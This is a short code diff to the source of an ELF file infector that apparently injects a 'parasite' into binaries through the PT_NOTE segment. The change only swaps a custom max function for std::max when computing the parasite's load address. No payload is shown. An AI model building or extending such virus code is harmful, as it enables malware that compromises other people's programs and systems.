@@ -1,5 +1,6 @@
 #include "infector/pt_note_infect.hh"
 #include <elf.h>
+#include <algorithm>
 #include "common/file_descriptor.hh"
 #include "common/patch_pattern.hh"
 #include "common/patch_relinguish_control.hh"
@@ -64,7 +65,7 @@ bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
       // segments.
       auto last_byte_of_segment = phdr_entry->p_vaddr + phdr_entry->p_memsz - 1;
       auto potential_virus_loading_addr = last_byte_of_segment + 1;
-      info.parasite_load_address = vt::max(
+      info.parasite_load_address = std::max(
           info.parasite_load_address,
           round_up_to(potential_virus_loading_addr, phdr_entry->p_align));
       // copy alignment so later we can assign to PT_NOTE.
